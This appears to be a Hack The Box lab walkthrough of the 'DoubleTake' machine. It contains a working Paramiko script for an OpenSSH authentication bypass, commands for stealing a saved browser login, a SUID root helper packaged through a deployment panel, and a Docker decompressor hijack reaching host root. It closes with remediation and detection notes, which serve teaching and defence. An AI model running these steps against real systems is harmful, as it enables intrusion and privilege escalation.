HACK THE BOX / LINUX / WALKTHROUGH

DoubleTake

From an OpenSSH authentication bypass to Docker host root.

Dylan Senez · d4rkgunn3r · Assessment November 13–14, 2026 · Edited November 16, 2026

Source and reproduction

My authorized HTB lab assessment, edited for the web. Results below are retained evidence, not a new retest. Captured secrets and proof values are removed. Missing custom source files are identified where needed; this page does not claim a complete standalone replay.

01 / Assessment summary

DoubleTake started with two exposed services: SSH and an HTTP Basic-authenticated Zentara panel. I obtained command execution as alpine inside the workspace container, recovered a panel credential, and used the deployment feature to write root-owned files into that container. A vulnerable Docker archive-decompression path then executed a replacement xz binary with host privileges.

The retained assessment records reads of the host user proof, root proof, and protected host files. Container root and host root are separate milestones: euid=0 in the workspace establishes the first; host process visibility and access through /proc/1/root support the second. Persistence, host modification beyond the probe workflow, and access to other containers were not tested.

OpenSSH musl authentication bypass → alpine container shell → saved panel credential → privileged archive extraction → container root → Docker decompressor hijack → host root

Assessment: November 13–14, 2026 UTC. Final instance: 10.129.104.66; earlier scans used 10.129.248.123. Tools recorded: Nmap 7.99, Python 3.12 / Paramiko 5.0.0, curl, and Go 1.24.2. Addresses identify the original lab instances; substitute your assigned target.

02 / Preparation and reconnaissance

I used a single working directory to keep scans, scripts, and evidence together. Commands in this section run on the attack workstation.

mkdir -p ~/doubletake/{evidence,loot,work}
cd ~/doubletake
export TARGET=10.129.104.66
nmap -p- --min-rate 3000 -T4 -Pn -n -oN loot/01_allports.txt "$TARGET"
nmap -sCV -p22,80 -Pn -n -oN loot/02_services.txt "$TARGET"

Recorded result · E01 · PDF pp. 6–7

22/tcp open ssh  OpenSSH 10.6 (protocol 2.0)
80/tcp open http nginx 1.24.0 (Ubuntu)
HTTP/1.1 401 UNAUTHORIZED
WWW-Authenticate: Basic realm="Zentara"

The SSH banner was a research lead, not proof of vulnerability. The relevant conditions are a musl-based SSH server without PAM, password authentication enabled, and the affected account/password-hash arrangement. I only confirmed the container OS after obtaining execution. The final SSH banner matched the earlier scan.

04 / Initial access through OpenSSH

The single oversized-password control failed. A short rejected attempt followed by a 300-byte password on the same SSH transport authenticated alpine. Keeping the transport open was material to the recorded result.

Recorded result · E03 · PDF pp. 10–13

[FAIL] alpine: AUTH_FAIL: Authentication failed.
[OK] alpine: uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
7f906e0ee8ec
3.22.8

This behavior is consistent with CVE-2026-123158. Alpine’s advisory describes the affected password fields and musl/no-PAM conditions. An Alpine release number alone is insufficient: distribution packages may contain backported fixes, and the running daemon must be restarted after upgrading. The transcript reports Alpine 3.22.8 alongside OpenSSH 10.6; it does not include a complete package provenance record.

Save the following as work/sshole_run.py. This is an editorially repaired, single-user form of the PDF’s Paramiko runner: the appendix omitted the command-line dispatch and its fixed sleep could truncate output. The revised listing waits for channel output and exit status. It has been syntax checked, not rerun against the machine.

import sys
import paramiko

host = sys.argv[1]
command = sys.argv[2] if len(sys.argv) > 2 else "id; hostname"
transport = paramiko.Transport((host, 22))
transport.banner_timeout = 25
try:
    transport.start_client(timeout=25)
    try:
        transport.auth_password("alpine", "not-the-password")
    except paramiko.AuthenticationException:
        pass
    transport.auth_password("alpine", "A" * 300)
    with transport.open_session(timeout=25) as channel:
        channel.set_combine_stderr(True)
        channel.settimeout(30)
        channel.exec_command(command)
        while True:
            data = channel.recv(8192)
            if not data:
                break
            sys.stdout.buffer.write(data)
            sys.stdout.buffer.flush()
        status = channel.recv_exit_status()
finally:
    transport.close()
sys.exit(status)
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install paramiko
python3 work/sshole_run.py "$TARGET" 'id; hostname; cat /etc/alpine-release'

For later container commands, pass the command string to this runner from the attack workstation. Each invocation establishes a fresh transport and repeats the two attempts. Authentication failure is not a reason to assume every account is vulnerable: verify the server build and account conditions.

05 / Recover and validate the panel credential

Inside the container, the alpine profile contained a saved Zentara login.

python3 work/sshole_run.py "$TARGET" \
  'cat /home/alpine/.mozilla/firefox/zentara.default/logins.json'

Recorded result · E04 · PDF pp. 14–15

hostname: http://172.17.0.1
httpRealm: Zentara
encType: 0
username: bob
password: [REDACTED IN PUBLIC COPY]

The supplied lab JSON contained fields whose values decoded directly with base64. This is a property of this example, not normal Firefox password encryption: real saved-login records generally require NSS key material. The profile directory was owned by alpine with mode 0700; the evidence supports access by the compromised owner, not a world-readable profile or proven password reuse across services.

Decode the two fields locally from the retrieved JSON, then validate the recovered password. This command prompts for it without putting the value in shell history:

curl -s -u bob -o /dev/null -w '%{http_code}\n' "http://$TARGET/"

The recorded response was 200. Use curl -u bob for subsequent authenticated requests and enter the recovered lab password when prompted. No captured password or encoded equivalent is embedded in this public version.

06 / Inspect the deployment trust boundary

curl -s -u bob "http://$TARGET/status"
curl -s -u bob "http://$TARGET/docs"
curl -s -u bob "http://$TARGET/deploy"

Recorded result · E05 · PDF pp. 16–17

Engine: Docker 29.5.0
API Version: 1.54
OS / Arch: linux/amd64
Workspace Container: zentara-alpine
Supported archives: .tar, .tar.gz, .tar.xz
Documented backend: PUT /containers/<container_name>/archive

The application accepted an archive plus a caller-selected workspace destination. The record includes a successful upload targeting /etc/ssh and history containing /workspace/../etc. A receipt alone does not prove the resulting filesystem state; later ownership and execution checks establish the privileged write.

For a harmless first check in an assigned instance, build a text archive and deploy it to a temporary directory, then inspect the result from the container. These setup commands are editorial additions; the original baseline used a pre-existing banner_test.tar.gz whose construction was not shown.

mkdir -p work/check
printf 'deployment check\n' > work/check/check.txt
tar -cf work/check.tar -C work/check check.txt
curl -s -u bob -F 'archive=@work/check.tar' \
  -F 'workspace=/tmp' "http://$TARGET/deploy"
python3 work/sshole_run.py "$TARGET" 'ls -l /tmp/check.txt; cat /tmp/check.txt'

The security issue is exposing privileged, caller-directed extraction through a network-facing application. The Docker archive API is an administrative interface; preserving metadata is not by itself a separate Docker vulnerability.

07 / Establish container root

The recorded escalation used a statically linked Go helper, packaged with mode 4755. The panel’s extraction created a root-owned SUID executable under /workspace. Run the build and upload commands on the workstation; the final checks execute in the container.

# Requires the original rootcmd.go source (not included in the PDF).
cd ~/doubletake/work/suid
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o rootcmd rootcmd.go
chmod 4755 rootcmd
tar --owner=0 --group=0 -czf ~/doubletake/loot/rootcmd.tar.gz rootcmd
cd ~/doubletake
curl -s -u bob -F "archive=@$HOME/doubletake/loot/rootcmd.tar.gz" \
  -F 'workspace=/workspace' "http://$TARGET/deploy"
python3 work/sshole_run.py "$TARGET" \
  'ls -la /workspace/rootcmd; /workspace/rootcmd idroot'

Recorded result · E06 · PDF pp. 18–19

-rwsr-xr-x root/root 5865634 rootcmd
uid=1000 euid=0 gid=1000 egid=1000

The effective UID establishes root execution inside the container while the real UID remains 1000. It does not establish host root. The retained record also shows access to the container shadow file; password hashes are omitted here.

Reproduction dependency: the PDF names work/suid/rootcmd.go and its supported modes but does not include that source. The commands above preserve the recorded sequence and explicitly require that artifact. An unrelated replacement helper would be a new implementation, not the original evidence. A nosuid mount prevents SUID elevation even if the mode bit is visible; it does not necessarily cause an execution-denied error.

08 / Cross into the Docker host

The decisive primitive was CVE-2026-41567: affected Docker archive extraction could resolve an external decompressor from the container filesystem and execute it with daemon privileges. This is a container-to-host trust-boundary crossing without a kernel exploit. The upstream advisory identifies Docker Engine 29.5.1 as the fixed release.

The record uses xz because it was present. Its original hash was captured and the binary preserved before replacement. Standard Docker CLI copy behavior sends uncompressed tar by default; the vulnerable path requires explicitly compressed input and an external helper.

# Execute inside the container before replacement:
ls -la /usr/bin/xz
sha256sum /usr/bin/xz
cp -p /usr/bin/xz /tmp/orig_xz

On the workstation, the original Go probe was compiled statically and packaged as usr/bin/xz. It wrote privilege-context markers and handed decompression to the saved genuine binary. The full xzprobe*.go implementations are not present in the PDF, so this is a documented artifact dependency.

# Requires the original work/xz/xzprobe.go and follow-on probe sources.
cd ~/doubletake/work/xz
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -o xz xzprobe.go
mkdir -p pkg/usr/bin
cp xz pkg/usr/bin/xz
chmod 755 pkg/usr/bin/xz
tar --owner=0 --group=0 -cf xzprobe.tar -C pkg usr/bin/xz
curl -s -u bob -F 'archive=@xzprobe.tar' \
  -F 'workspace=/' "http://$TARGET/deploy"

# Build the trigger with the workstation's genuine xz binary.
mkdir -p trig
printf 'trigger\n' > trig/trigger.txt
tar -cf trig/trigger.tar -C trig trigger.txt
xz -k -f trig/trigger.tar
curl -s -u bob -F 'archive=@trig/trigger.tar.xz' \
  -F 'workspace=/tmp' "http://$TARGET/deploy"

Recorded result · E07 · PDF pp. 21–22

argv=["xz" "-d" "-c" "-q"]

An upload success message is not execution proof. The marker, effective capabilities, and host hostname supported a host-context hypothesis; UID 0 or hostname alone would be insufficient. The later probe mounted procfs and demonstrated host process and filesystem visibility.

The PDF includes snippets for mounting procfs and reading /proc/1/root, but not the complete follow-on probe. This publication does not claim the excerpts alone form a complete runnable exploit or that a separate interactive host shell was obtained.

09 / Cleanup and residual state

The assessment used additional deployment payloads to remove probes and restore the genuine xz. The final check matched the pre-test hash and reported the original workspace directories. The cleanup source files and archives are referenced but not included in the supplied PDF; do not attempt restoration using nonexistent archives.

Recorded result · E09 · PDF pp. 26–27

/usr/bin/xz SHA-256:
39a97b2cabdfca71a9ebc089be4ea4c2ee08ef59300289b972de05c034b3e417
xz (XZ Utils) 5.8.4
/workspace: api-service, db, docs
/tmp and /dev/shm: reported empty

Deployment-history records remained because the application exposed no deletion action. The record does not prove that all forensic artifacts disappeared: application and system logs, audit telemetry, and filesystem traces may remain. No API-token rotation was recorded; the displayed token was already expired. For a repeat lab run without the original cleanup artifacts, preserve evidence and reset the assigned instance rather than improvising a replacement of a critical binary.

10 / Remediation and detection

Break the chain at several independent boundaries: patch the actual running OpenSSH package and restart sshd; upgrade Docker Engine to a fixed supported release; remove network-facing access to privileged archive APIs; and extract uploads as an unprivileged worker into a fixed directory while validating paths, symlinks, ownership, and modes. Keep browser profiles and administrative credentials out of workspace images.

Apply authentication consistently to intended private routes and verify the application enforces authorization itself. Treat the expired token display as a hygiene observation: the record does not establish valid token use, a functioning external integration, or a complete absence of backend revocation. A standalone exploitable-token finding is not supported.

BehaviorUseful telemetry
Failed then accepted password for a key-only accountCorrelated sshd authentication records and account configuration
Deploy destination outside the intended workspaceApplication request/audit records; ordinary access logs may omit multipart fields
Root-owned SUID file created in a workspaceFile-integrity and execution telemetry
Container decompressor replaced and executed by the daemonHost process ancestry, executable identity, namespace context, overlay file changes
Browser credential file read by a non-browser processFile-access auditing on the relevant profile

These are investigation leads, not deployed or tested detection rules. Standard SSH logs do not expose plaintext password lengths, so “password longer than 256 bytes” is not a reliable ordinary-log detection.

11 / Evidence and reproduction limits

This page was edited from DoubleTake_Walkthrough(1).pdf, 43 pages. Evidence IDs above point to the supplied report pages; original raw logs were not independently supplied or re-executed for this publication. The code examples are text, not reconstructed screenshots.
